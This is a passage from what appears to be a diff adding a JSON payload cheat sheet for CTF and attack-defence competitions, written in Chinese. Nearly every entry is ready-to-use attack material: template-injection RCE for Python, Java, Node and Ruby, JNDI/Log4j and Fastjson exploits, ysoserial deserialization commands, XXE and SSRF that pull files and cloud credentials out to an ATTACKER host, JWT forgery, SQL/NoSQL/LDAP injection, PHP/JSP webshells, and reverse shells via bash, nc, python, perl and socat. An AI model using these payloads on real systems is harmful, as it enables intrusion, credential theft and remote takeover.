+   "body": "{0.__class__}\n{0.__class__.__mro__[1].__subclasses__()}\n{0.__init__.__globals__[os].popen('id').read()}\n{user.__init__.__globals__[__builtins__][__import__](os).popen('id').read()}\n# 探测\n{a}\n{0!r}\n{0:>100}"
+  },
+  {
+   "id": "payload-python-ssrf-file",
+   "title": "Python SSRF: requests / urllib 协议面",
+   "language": "python",
+   "category": "ssrf",
+   "description": "requests 不支持 gopher，但 urllib/httplib 支持；能控 scheme 时先试 file://。",
+   "body": "file:///etc/passwd\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://100.100.100.200/latest/meta-data/\nhttp://metadata.google.internal/computeMetadata/v1/\n# urllib 打 Redis\nurllib.request.urlopen('dict://127.0.0.1:6379/info')\n# 绕过 host 校验\nhttp://127.0.0.1:6379  http://0.0.0.0:6379  http://[::1]:6379\nhttp://2130706433:6379  http://0x7f000001:6379  http://127.1:6379\nhttp://ATTACKER@127.0.0.1:6379\n# DNS rebinding / 302 跳转\nhttp://ATTACKER/r?to=http://127.0.0.1:6379"
+  },
+  {
+   "id": "payload-python-jwt-none",
+   "title": "Python JWT: 算法混淆与密钥爆破",
+   "language": "python",
+   "category": "jwt",
+   "description": "PyJWT 老版本接受 alg=none；RS256 公钥泄露时可改成 HS256 用公钥当密钥。",
+   "body": "# 1) alg=none\n{\"alg\":\"none\",\"typ\":\"JWT\"} + {\"user\":\"admin\",\"role\":\"admin\"} + \"\"\n# 2) RS256 → HS256（用泄露的公钥当 HMAC 密钥）\njwt.encode({\"user\":\"admin\"}, open('pub.pem').read(), algorithm='HS256')\n# 3) 弱密钥爆破\nhashcat -m 16500 jwt.txt rockyou.txt\npython3 jwt_tool.py <JWT> -C -d rockyou.txt\n# 4) kid 注入\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}      # 空密钥\n{\"alg\":\"HS256\",\"kid\":\"/etc/passwd\"}               # 读文件当密钥\n{\"alg\":\"HS256\",\"kid\":\"x' union select 'k'-- -\"}   # SQL 注入\n# 5) jku / x5u 指向自己的 JWKS"
+  },
+  {
+   "id": "payload-python-xxe-lxml",
+   "title": "Python XXE: lxml / xml.etree",
+   "language": "python",
+   "category": "xxe",
+   "description": "lxml resolve_entities=True 时可用外部实体；xml.etree 默认不解析实体但可被 xxe 库影响。",
+   "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>\n# 盲外带\n<!DOCTYPE r [<!ENTITY % f SYSTEM \"http://ATTACKER/e.dtd\">%f;]>\n# e.dtd\n<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'http://ATTACKER/?%a;'>\">%b;%c;\n# 常见受影响解析\nlxml.etree.parse(..., resolve_entities=True)\nxmltodict.parse  /  defusedxml 缺失的 xml.dom.minidom"
+  },
+  {
+   "id": "payload-python-path-traversal",
+   "title": "Python 路径穿越与任意文件读写",
+   "language": "python",
+   "category": "lfi",
+   "description": "os.path.join 会吞掉前缀，但拼接方式不同结果不同；先试绝对路径再试穿越。",
+   "body": "?file=../../../../etc/passwd\n?file=/etc/passwd\n?file=....//....//etc/passwd\n?file=%2e%2e%2f%2e%2e%2fetc/passwd\n?file=..%252f..%252fetc/passwd\n# Flask send_file 绝对路径\n?file=/etc/passwd\n# 读源码（含密钥）\n?file=../app/config.py\n?file=../.env\n# 写文件（上传点 + 穿越文件名）\nfilename=../../static/x.py"
+  },
+  {
+   "id": "payload-java-spel-tricks",
+   "title": "Java SpEL 注入: 无回显与沙箱",
+   "language": "java",
+   "category": "ssti",
+   "description": "Spring 的 SpEL 默认能反射调 Runtime；SimpleEvaluationContext 会拦，先探。",
+   "body": "${7*7}\n#{7*7}\n${T(java.lang.Runtime).getRuntime().exec('id')}\n${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}\n# 回显\n${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}\n${new String(T(java.lang.Runtime).getRuntime().exec('id').getInputStream().readAllBytes())}\n# 绕 getClass 黑名单\n${T(String).getClass().forName(\"java.lang.Run\"+\"time\")}\n# Spring Cloud Function / Gateway 表达式注入\nspring.cloud.function.routing-expression=T(java.lang.Runtime).getRuntime().exec(\"id\")"
+  },
+  {
+   "id": "payload-java-ognl",
+   "title": "Java OGNL 注入: Struts2 变体",
+   "language": "java",
+   "category": "ssti",
+   "description": "Struts2 各版本过滤不同，S2-045/046/016/032/057 手法要按版本试。",
+   "body": "%{(#a=@java.lang.Runtime@getRuntime()).exec('id')}\n%{#context['xwork.MethodAccessor.denyMethodExecution']=false,\n#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),\n#f.setAccessible(true),#f.set(#_memberAccess,true),\n@java.lang.Runtime@getRuntime().exec('id')}\n# S2-045（Content-Type）\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}\n# S2-057（namespace）\n/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack']...)}/action"
+  },
+  {
+   "id": "payload-java-cc-gadget",
+   "title": "Java 反序列化: CC / CB 链生成",
+   "language": "java",
+   "category": "deserialization",
+   "description": "ysoserial 一键生成；目标 classpath 决定用哪条链，先探依赖版本。",
+   "body": "java -jar ysoserial.jar CommonsCollections1 'id' > p.bin\njava -jar ysoserial.jar CommonsCollections5 'bash -c {echo,}|{base64,-d}|bash' > p.bin\njava -jar ysoserial.jar CommonsCollections6 'id' > p.bin\njava -jar ysoserial.jar CommonsBeanutils1 'id' > p.bin\njava -jar ysoserial.jar URLDNS 'http://ATTACKER/' > p.bin     # 只探测，不依赖链\njava -jar ysoserial.jar JRMPClient 'ATTACKER:1099' > p.bin\n# 无 ysoserial 时用 marshalsec / JNDIExploit\n# 入口：readObject、XStream、Hessian、Kryo、Jackson default typing、Fastjson、Shiro rememberMe"
+  },
+  {
+   "id": "payload-java-jndi-ldap",
+   "title": "Java JNDI 注入: LDAP / RMI 引用",
+   "language": "java",
+   "category": "rce",
+   "description": "JDK 高版本默认禁远程 codebase，但本地工厂类（Tomcat BeanFactory、Groovy）仍可用。",
+   "body": "${jndi:ldap://ATTACKER:1389/Exploit}\n${jndi:rmi://ATTACKER:1099/Exploit}\n${jndi:ldap://ATTACKER:1389/Basic/Command/Base64/<b64>}\n# 本地工厂（JDK 8u191+ 可用）\nldap://ATTACKER:1389/TomcatBypass/TomcatEcho\nldap://ATTACKER:1389/TomcatBypass/GroovyEcho\n# 8u121 前可远程 codebase\n-Dcom.sun.jndi.ldap.object.trustURLCodebase=true\n# 工具\nJNDIExploit-1.4-SNAPSHOT.jar -i ATTACKER -p 8888\nmarshalsec: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://ATTACKER:8000/#Exploit 1389"
+  },
+  {
+   "id": "payload-java-xxe-oob",
+   "title": "Java XXE: 外带与盲打",
+   "language": "java",
+   "category": "xxe",
+   "description": "Java 解析器对参数实体支持好，OOB 成功率高于 PHP；注意 JDK 版本对 http 实体的限制。",
+   "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>\n# OOB\n<!DOCTYPE r [<!ENTITY % f SYSTEM \"http://ATTACKER/e.dtd\">%f;]>\n# e.dtd\n<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'http://ATTACKER/?%a;'>\">%b;%c;\n# 无外网时读本地并报错回显\n<!DOCTYPE r [<!ENTITY % f SYSTEM \"file:///nonexist/%file;\">]>\n# 常见点：SOAP、SVG 上传、docx/xlsx 解析、Solr、WebLogic"
+  },
+  {
+   "id": "payload-java-ssti-freemarker",
+   "title": "Java SSTI: Freemarker / Velocity",
+   "language": "java",
+   "category": "ssti",
+   "description": "Freemarker 的 Execute 内建函数在 2.3.30 后需配置，老版本直接 RCE。",
+   "body": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>${ob(\"java.lang.ProcessBuilder\",\"id\").start()}\n<#assign j=\"freemarker.template.utility.JythonRuntime\"?new()><@j>import os;os.system(\"id\")</@j>\n# Velocity\n#set($e=\"e\");$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")"
+  },
+  {
+   "id": "payload-java-sql-mybatis",
+   "title": "Java SQL 注入: MyBatis ${} 与 JDBC 特性",
+   "language": "java",
+   "category": "sqli",
+   "description": "MyBatis 里 #{} 安全、${} 拼接；MySQL 驱动还能用 allowMultiQueries / LOAD_FILE。",
+   "body": "' or 1=1-- \n' union select 1,2,3-- \n# 堆叠（需 allowMultiQueries=true）\n'; update users set password='x' where id=1-- \n# MySQL 读文件\n' union select load_file('/etc/passwd'),2-- \n# 报错注入\n' and extractvalue(1,concat(0x7e,(select user())))-- \n# order by 注入（预处理无效）\n?sort=id,(select 1 from (select sleep(3))a)\n?sort=if(1=1,id,password)\n# 常见点：MyBatis ${}、JPA 原生查询拼接、@Query + 字符串、order by 动态列"
+  },
+  {
+   "id": "payload-java-actuator",
+   "title": "Spring Boot Actuator 信息泄露与利用",
+   "language": "java",
+   "category": "info-leak",
+   "description": "Actuator 端点常直接暴露环境变量（含 flag）、heapdump（可捞口令）、甚至 jolokia 执行。",
+   "body": "/actuator\n/actuator/env\n/actuator/env/spring.datasource.password\n/actuator/configprops\n/actuator/heapdump          → 用 jvisualvm / heapdump_tool 搜 password、flag\n/actuator/threaddump\n/actuator/mappings\n/actuator/gateway/routes   → 配合 SpEL 注入 RCE\n/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/tmp/x.jar\n# 打 heapdump 关键命令\njhat heapdump &  → 搜 \"flag{\"\nstrings heapdump | grep -iE 'password|secret|flag'\n# 老路径\n/env  /health  /refresh  /restart  /shutdown"
+  },
+  {
+   "id": "payload-java-log4j",
+   "title": "Log4j2 JNDI: 变体与绕过",
+   "language": "java",
+   "category": "rce",
+   "description": "2.15/2.16/2.17 逐个修补，高版本仍可打本地工厂；所有会被记录的输入都是注入点。",
+   "body": "${jndi:ldap://ATTACKER:1389/a}\n${jndi:ldaps://ATTACKER:636/a}\n${jndi:dns://ATTACKER/a}                       # 只探测\n${${lower:j}ndi:${lower:l}dap://ATTACKER/a}    # 绕关键字\n${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://ATTACKER/a}\n${jndi:${env:BARFOO:-l}${env:BARFOO:-d}ap://ATTACKER/a}\n${jndi:ldap://ATTACKER:1389/#${sys:user.name}}\n# 常见注入点：UA、X-Forwarded-For、用户名、搜索词、异常栈"
+  },
+  {
+   "id": "payload-java-fastjson",
+   "title": "Fastjson 版本探测与利用",
+   "language": "java",
+   "category": "deserialization",
+   "description": "先判版本（1.2.x），1.2.24/1.2.47 有通杀链，之后靠 autoType 白名单绕过。",
+   "body": "{\"@type\":\"java.net.Inet4Address\",\"val\":\"dns.ATTACKER\"}\n{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dns.ATTACKER\"}}\n# 1.2.24\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://ATTACKER:1389/a\",\"autoCommit\":true}\n# 1.2.47（缓存绕过，无需 autoType）\n{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\n \"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://ATTACKER/a\",\"autoCommit\":true}}\n# 1.2.68+（期望类绕过）\n{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",...}\n# 探测版本\n{\"@type\":\"java.lang.Class\",\"val\":\"java.lang.Object\"}  → 报错含版本号"
+  },
+  {
+   "id": "payload-node-ssti-handlebars",
+   "title": "Node SSTI: EJS / Handlebars / Pug",
+   "language": "nodejs",
+   "category": "ssti",
+   "description": "EJS 的 <%= %> 直接执行 JS；Handlebars 靠原型上的 constructor 摸到 process。",
+   "body": "# EJS\n<%= 7*7 %>\n<%= global.process.mainModule.require('child_process').execSync('id') %>\n<%= require('child_process').execSync('id').toString() %>\n# Handlebars\n{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}\n# Pug / Jade\n#{global.process.mainModule.require('child_process').execSync('id')}\n# 探测\n{{7*7}}  #{7*7}  ${7*7}"
+  },
+  {
+   "id": "payload-node-nosqli-blind",
+   "title": "Node NoSQL 注入: Mongo 操作符与盲注",
+   "language": "nodejs",
+   "category": "nosqli",
+   "description": "Express + Mongoose 里未校验对象类型就能塞 $ne/$regex；$where 可跑 JS。",
+   "body": "{\"username\":\"admin\",\"password\":{\"$ne\":null}}\n{\"username\":{\"$regex\":\"^a\"},\"password\":{\"$ne\":\"x\"}}\n{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}\n# URL 编码形式\nusername[$ne]=x&password[$ne]=x\nusername[$regex]=^adm&password[$gt]=\n# 盲注（正则逐位）\n{\"$where\":\"this.password.match(/^a/)!=null\"}\n{\"$where\":\"sleep(3000)||true\"}\n# 数组绕过\nusername=admin&password[$in][]=1\n# 原型污染配合\n{\"__proto__\":{\"$ne\":1}}"
+  },
+  {
+   "id": "payload-node-proto-chain",
+   "title": "Node 原型污染 → RCE 链",
+   "language": "nodejs",
+   "category": "prototype-pollution",
+   "description": "单纯污染只是改属性，配合 child_process / ejs / lodash.template 才能到 RCE。",
+   "body": "# 1) 污染入口\n{\"__proto__\":{\"polluted\":\"yes\"}}\n{\"constructor\":{\"prototype\":{\"polluted\":\"yes\"}}}\n# 2) 检测\n{}.polluted\n# 3) 打 child_process（NODE_OPTIONS 注入）\n{\"__proto__\":{\"shell\":\"node\",\"argv0\":\"console.log(require('child_process').execSync('id').toString())//\",\"NODE_OPTIONS\":\"--require /proc/self/cmdline\"}}\n{\"__proto__\":{\"env\":{\"EVIL\":\"console.log(process.mainModule.require('child_process').execSync('id').toString())//\"},\"shell\":\"/proc/self/exe\",\"argv0\":\"console\"}}\n# 4) 打 ejs\n{\"__proto__\":{\"client\":true,\"escapeFunction\":\"1;return global.process.mainModule.require('child_process').execSync('id');\"}}\n# 5) 打 lodash.template\n{\"__proto__\":{\"source\":\"<%= global.process.mainModule.require('child_process').execSync('id') %>\"}}"
+  },
+  {
+   "id": "payload-node-ssrf-gopher",
+   "title": "Node SSRF: 内网与元数据",
+   "language": "nodejs",
+   "category": "ssrf",
+   "description": "Node 的 http 模块不支持 gopher，但 axios 走 http 时能访问内网任意 HTTP 服务。",
+   "body": "http://169.254.169.254/latest/meta-data/\nhttp://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\nhttp://100.100.100.200/latest/meta-data/\nhttp://127.0.0.1:2375/containers/json        # Docker API\nhttp://127.0.0.1:8500/v1/catalog/services    # Consul\nhttp://127.0.0.1:6379/  （用 http 打不了，改 CRLF 注入）\n# 绕过 host 校验\nhttp://127.0.0.1@ATTACKER/\nhttp://ATTACKER#@127.0.0.1/\nhttp://127.0.0.1:80\\@ATTACKER/\n# 302 跳转绕过（自己起服务返回 Location: http://127.0.0.1:6379）"
+  },
+  {
+   "id": "payload-node-deser-node-serialize",
+   "title": "Node 反序列化: node-serialize / funcster",
+   "language": "nodejs",
+   "category": "deserialization",
+   "description": "node-serialize 的 unserialize 会执行 _$$ND_FUNC$$_ 包裹的函数体。",
+   "body": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()\"}\n# 变体（立即执行必须带 ()）\n{\"rce\":\"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()\"}\n# funcster / cryo 同源问题\n# 入口：cookie（profile=）、session、缓存、socket.io 消息、Electron IPC"
+  },
+  {
+   "id": "payload-node-path-traversal",
+   "title": "Node 路径穿越与 zip slip",
+   "language": "nodejs",
+   "category": "lfi",
+   "description": "res.sendFile / fs.readFile 拼接时用绝对路径或 ../；path.join 会规范化但 path.resolve 不会拦绝对路径。",
+   "body": "?file=../../../../etc/passwd\n?file=/etc/passwd\n?file=..%2f..%2f..%2fetc%2fpasswd\n?file=....//....//etc/passwd\n# 绕过 path.normalize 检查（先 normalize 再拼接的写法）\n?file=../../etc/passwd%00.png\n# zip slip（adm-zip / unzipper / tar）\n压缩包内条目名 ../../../../var/www/html/x.js\n# 常见点：res.download(userPath)、fs.createReadStream、serve-static 老版本"
+  },
+  {
+   "id": "payload-node-sql-sequelize",
+   "title": "Node SQL 注入: Sequelize / Knex",
+   "language": "nodejs",
+   "category": "sqli",
+   "description": "Sequelize 的 where 传字符串直接拼接；Op 操作符可控时也能越权查询。",
+   "body": "' or 1=1-- \n' union select 1,2,3-- \n# Sequelize where 字符串拼接\n?name=' OR 1=1--\n# Op 注入\n?status[$ne]=1\n?role[$in][]=admin\n# order by 注入\n?sort=id,(select 1 from (select sleep(3))a)\n# limit 注入\n?limit=1;select sleep(3)"
+  },
+  {
+   "id": "payload-node-jwt-jku",
+   "title": "Node JWT: jku / x5u / kid 注入",
+   "language": "nodejs",
+   "category": "jwt",
+   "description": "jsonwebtoken 老版本不校验 jku；kid 可注入路径或 SQL。",
+   "body": "# 1) alg=none\n{\"alg\":\"none\",\"typ\":\"JWT\"}\n# 2) jku 指向自己的 JWKS\n{\"alg\":\"RS256\",\"jku\":\"http://ATTACKER/jwks.json\",\"kid\":\"k1\"}\n# 3) x5u\n{\"alg\":\"RS256\",\"x5u\":\"http://ATTACKER/cert.pem\"}\n# 4) kid 路径穿越（密钥读文件）\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}\n# 5) kid SQL 注入\n{\"alg\":\"HS256\",\"kid\":\"x' union select 'secret'-- -\"}\n# 6) HS256 用公钥当密钥\njwt.sign({user:'admin'}, publicKey, {algorithm:'HS256'})"
+  },
+  {
+   "id": "payload-go-ssti-html",
+   "title": "Go 模板注入: text/template",
+   "language": "go",
+   "category": "ssti",
+   "description": "html/template 会转义，text/template 不转义；能控模板内容时可直接调函数。",
+   "body": "{{.}}\n{{printf \"%s\" .}}\n{{.Password}}\n# text/template 可调用导出方法\n{{.ReadFile \"/etc/passwd\"}}\n{{.Exec \"id\"}}\n# 探测\n{{7*7}}  →  49 表示模板被执行（非变量替换）\n# 入口：邮件模板、报表模板、Prometheus 配置、Hugo 主题"
+  },
+  {
+   "id": "payload-go-sql-gorm",
+   "title": "Go SQL 注入: GORM / database/sql",
+   "language": "go",
+   "category": "sqli",
+   "description": "db.Raw / db.Exec 拼接、Order(userInput)、Where(fmt.Sprintf) 都是注入点。",
+   "body": "' or 1=1-- \n' union select 1,2,3-- \n# Order 注入\n?sort=id;select pg_sleep(3)\n# 时间盲注（PG）\n' and 1=(select 1 from pg_sleep(3))--\n# MySQL\n' and sleep(3)-- \n# 常见点\ndb.Raw(\"select * from u where name='\" + name + \"'\")\ndb.Order(param).Find(&u)\ndb.Where(fmt.Sprintf(\"id=%s\", id))"
+  },
+  {
+   "id": "payload-go-ssrf",
+   "title": "Go SSRF: http.Client 任意协议",
+   "language": "go",
+   "category": "ssrf",
+   "description": "Go 的 http.Client 支持 http/https，加上自定义 Transport 可打 unix socket。",
+   "body": "http://169.254.169.254/latest/meta-data/\nhttp://127.0.0.1:2375/version\nhttp://127.0.0.1:8080/actuator/env\nfile:///etc/passwd        （需 url.Parse + os.Open 路径）\n# 绕过校验\nhttp://127.0.0.1:80@ATTACKER/\nhttp://0x7f000001/\nhttp://[::ffff:127.0.0.1]/\n# 302 跳转"
+  },
+  {
+   "id": "payload-go-file-write",
+   "title": "Go 任意文件写入 → webshell",
+   "language": "go",
+   "category": "upload",
+   "description": "os.Create / ioutil.WriteFile 可控路径时可直写；注意 Go 服务多为静态二进制，权限常为 nobody。",
+   "body": "/../../../../var/www/html/x.php\n/../../../../tmp/x.jsp\n# 内容\n<?php @eval($_POST[1]);?>\n<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>\n# 覆盖配置提权（AWD 常用）\n../config/database.php\n../.env\n# 若无写权限：写 /tmp 后包含、或改 crontab"
+  },
+  {
+   "id": "payload-go-archive-slip-2",
+   "title": "Go 压缩包路径穿越: tar/zip slip",
+   "language": "go",
+   "category": "archive-slip",
+   "description": "archive/tar 与 archive/zip 不校验条目名，直接 filepath.Join 就会写到目标目录外。",
+   "body": "# tar 条目名\n../../../../var/www/html/x.php\n..\\..\\..\\..\\windows\\temp\\x.aspx\n# 绝对路径条目\n/etc/cron.d/x\n# 符号链接穿越（先建软链再写）\nlink -> /var/www/html\nlink/x.php\n# 生成\npython3 -c \"import tarfile,io;t=tarfile.open('x.tar','w');i=tarfile.TarInfo('../../var/www/html/x.php');d=b'<?php eval(\\$_POST[1]);?>';i.size=len(d);t.addfile(i,io.BytesIO(d));t.close()\""
+  },
+  {
+   "id": "payload-go-jwt",
+   "title": "Go JWT: golang-jwt 算法混淆",
+   "language": "go",
+   "category": "jwt",
+   "description": "golang-jwt v3 及以前 Keyfunc 不校验 alg，可用 none 或 HS256 混淆。",
+   "body": "# 1) none\n{\"alg\":\"none\",\"typ\":\"JWT\"}  +  {\"user\":\"admin\"}\n# 2) HS256 + 公钥\ntoken.SignedString([]byte(publicKeyPEM))\n# 3) 弱密钥\nhashcat -m 16500 jwt.txt rockyou.txt\n# 4) kid 注入\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}"
+  },
+  {
+   "id": "payload-ruby-erb",
+   "title": "Ruby SSTI / 代码执行: ERB",
+   "language": "ruby",
+   "category": "ssti",
+   "description": "ERB 的 <%= %> 直接执行 Ruby；Rails 里 render inline: params[:x] 是高危写法。",
+   "body": "<%= 7*7 %>\n<%= system('id') %>\n<%= `id` %>\n<%= IO.popen('id').read %>\n<%= File.read('/etc/passwd') %>\n# 探测\n<%= 7*7 %>  →  49\n# 入口：render inline:、ERB.new(user_input).result、Slim/Haml 动态模板"
+  },
+  {
+   "id": "payload-ruby-yaml",
+   "title": "Ruby 反序列化: YAML.load / Marshal",
+   "language": "ruby",
+   "category": "deserialization",
+   "description": "Ruby < 3.1 的 YAML.load 等同 unsafe_load；Marshal.load 只要能被控就是 RCE。",
+   "body": "--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Installer\n    i: x\n# 通用 gadget（Psych < 4）\n--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\n  io: &1 !ruby/object:Net::BufferedIO\n    io: &1 !ruby/object:Gem::Package::TarReader::Entry\n       read: 0\n       header: \"abc\"\n# Marshal\nMarshal.load(Base64.decode64(cookie))"
+  },
+  {
+   "id": "payload-csharp-viewstate",
+   "title": "C#/.NET 反序列化: ViewState / BinaryFormatter",
+   "language": "csharp",
+   "category": "deserialization",
+   "description": "ViewState 无 MAC 时可用 ysoserial.net 直打；BinaryFormatter 更是通杀。",
+   "body": "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c whoami\" --path=\"/default.aspx\" --apppath=\"/\" --decryptionalg=\"AES\" --decryptionkey=\"...\" --validationalg=\"SHA1\" --validationkey=\"...\"\nysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c \"cmd /c whoami\" -o base64\nysoserial.exe -g ObjectDataProvider -f DataContractSerializer -c \"cmd /c whoami\"\n# 探测 ViewState MAC 是否关闭\n__VIEWSTATE=AAAA  →  报 MAC 校验失败 = 开启；报格式错误 = 关闭\n# 常见入口：ASP.NET ViewState、.NET Remoting、WCF、Session、Cookie"
+  },
+  {
+   "id": "payload-shell-reverse",
+   "title": "Shell 反弹合集（含无 nc 环境）",
+   "language": "shell",
+   "category": "rce",
+   "description": "AWD 靶机常无 nc/python，多准备几条，注意出网方向可能只有 80/443。",
+   "body": "bash -i >& /dev/tcp/ATTACKER/4444 0>&1\nbash -c 'exec 5<>/dev/tcp/ATTACKER/443;cat <&5|while read l;do $l 2>&5;done'\nnc ATTACKER 4444 -e /bin/sh\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'\nperl -e 'use Socket;$i=\"ATTACKER\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444"
+  },
+  {
+   "id": "payload-multi-cmd-bypass",
+   "title": "命令执行: 分隔符 / 编码 / 通配符全集",
+   "language": "mixed",
+   "category": "rce",
+   "description": "过滤不严时按顺序试：分隔符 → 空格替换 → 关键字拆分 → 编码还原。",
+   "body": ";id  &&id  ||id  |id  %0aid  `id`  $(id)  \\n id\n# 空格\n$IFS  ${IFS}  $IFS$9  %09  %20  <  >  {cat,/etc/passwd}\n# 关键字\nc'a't /etc/passwd\nc\"\"at /etc/passwd\n/???/??t /etc/passwd        # 通配符\n$(printf 'cat') /etc/passwd\necho Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh\n# 变量拼接\na=c;b=at;$a$b /etc/passwd\n# 内建\n{echo,id}\n# Windows\nwhoami & dir & type C:\\flag.txt\ncmd /c \"whoami\"\npowershell -c \"whoami\"\npo^w^e^r^s^h^e^l^l -c whoami"
+  },
+  {
+   "id": "payload-multi-jwt-none",
+   "title": "JWT: none / 弱密钥 / 头注入（通用）",
+   "language": "mixed",
+   "category": "jwt",
+   "description": "三分钟能跑完的 JWT 检查清单，先 none，再爆破，再头注入。",
+   "body": "# 1) none（大小写都试）\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.\n# 2) 空签名 / 保留原签名\n# 3) 弱密钥\nhashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\njohn jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256\n# 4) 头注入\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}\n{\"alg\":\"HS256\",\"jku\":\"http://ATTACKER/jwks.json\"}\n{\"alg\":\"RS256\",\"x5u\":\"http://ATTACKER/c.pem\"}\n# 5) 算法混淆 RS256→HS256（公钥当密钥）\n# 6) 声明篡改\n{\"sub\":\"admin\",\"role\":\"admin\",\"is_admin\":true,\"exp\":9999999999}"
+  },
+  {
+   "id": "payload-multi-ssrf-cloud",
+   "title": "SSRF: 云元数据与内网服务清单",
+   "language": "mixed",
+   "category": "ssrf",
+   "description": "拿到 SSRF 先打元数据拿凭据，再横向内部面板。",
+   "body": "# AWS\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/user-data\n# 阿里云\nhttp://100.100.100.200/latest/meta-data/\n# GCP（需 Header: Metadata-Flavor: Google）\nhttp://metadata.google.internal/computeMetadata/v1/\n# Azure\nhttp://169.254.169.254/metadata/instance?api-version=2021-02-01\n# 内网常见\nhttp://127.0.0.1:2375/containers/json          Docker API\nhttp://127.0.0.1:8500/v1/agent/self            Consul\nhttp://127.0.0.1:8080/actuator/env             Spring\nhttp://127.0.0.1:9200/_cat/indices             ES\nhttp://127.0.0.1:6379/                        Redis（配 gopher）\nhttp://127.0.0.1:9000/                        PHP-FPM"
+  },
+  {
+   "id": "payload-multi-ldap",
+   "title": "LDAP 注入",
+   "language": "mixed",
+   "category": "ldap",
+   "description": "登录框拼接 (&(uid=INPUT)(userPassword=INPUT)) 时可用通配符与逻辑运算绕过。",
+   "body": "*\n*)(uid=*))(|(uid=*\nadmin)(&)\nadmin)(|(password=*\n*)(objectClass=*\n)(cn=*\n# 盲注（按属性逐位）\nadmin)(|(description=a*)\nadmin)(|(userPassword=a*)\n# 空口令\nadmin)(&(userPassword=*\n# 过滤绕过\n\\2a  \\28  \\29  \\00  \\5c"
+  },
+  {
+   "id": "payload-multi-xpath",
+   "title": "XPath 注入",
+   "language": "mixed",
+   "category": "xpath",
+   "description": "XPath 无注释语法，靠括号闭合与 or 恒真绕过登录校验。",
+   "body": "' or '1'='1\n' or 1=1 or ''='\nx' or name()='username' or 'a'='b\n# 盲注\n' or string-length(name(/*[1]))=5 or '1'='2\n' or substring(name(/*[1]),1,1)='a' or '1'='2\n# 读节点\n' or count(/*)=1 or 'a'='b"
+  },
+  {
+   "id": "payload-multi-crlf",
+   "title": "CRLF 注入 / 响应拆分",
+   "language": "mixed",
+   "category": "crlf",
+   "description": "所有进 header 的参数都试一遍，常见于跳转、下载、邮件。",
